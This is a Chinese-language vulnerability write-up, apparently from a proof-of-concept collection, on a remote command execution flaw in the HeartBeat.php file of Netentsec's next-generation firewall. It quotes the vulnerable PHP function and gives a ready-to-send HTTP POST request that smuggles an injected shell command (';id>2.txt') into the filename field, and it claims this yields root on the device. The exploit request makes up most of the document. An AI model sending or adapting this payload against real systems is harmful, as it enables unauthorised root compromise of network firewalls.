# 网康 下一代防火墙 HeartBeat.php 远程命令执行漏洞

## 漏洞描述
网康 下一代防火墙 HeartBeat.php文件存在远程命令执行漏洞，攻击者通过构造请求包即可获取服务器Root权限

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面如下

![image-20230314085835290](images/image-20230314085835290.png)

出现漏洞的文件 applications/Models/NS/Rpc/HeartBeat.php

![image-20230314085853048](images/image-20230314085853048.png)

```
public function delTestFile($fileName){

## Payloads
```
public function delTestFile($fileName){
	    if(dirname($fileName) == '/var/www/tmp'){
		$cmd = "/bin/rm -f {$fileName}";
		putenv("CMD=$cmd");
		$msg = shell_exec('/var/www/html/scripts/exec_cmd');
	    }
	    return time();
	}
```
```
POST /directdata/direct/router HTTP/1.1
Host: 
Connection: close
Content-Length: 179
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

{"action":"NS_Rpc_HeartBeat","method":"delTestFile","data": ["/var/www/tmp/1.txt;id>2.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}
```
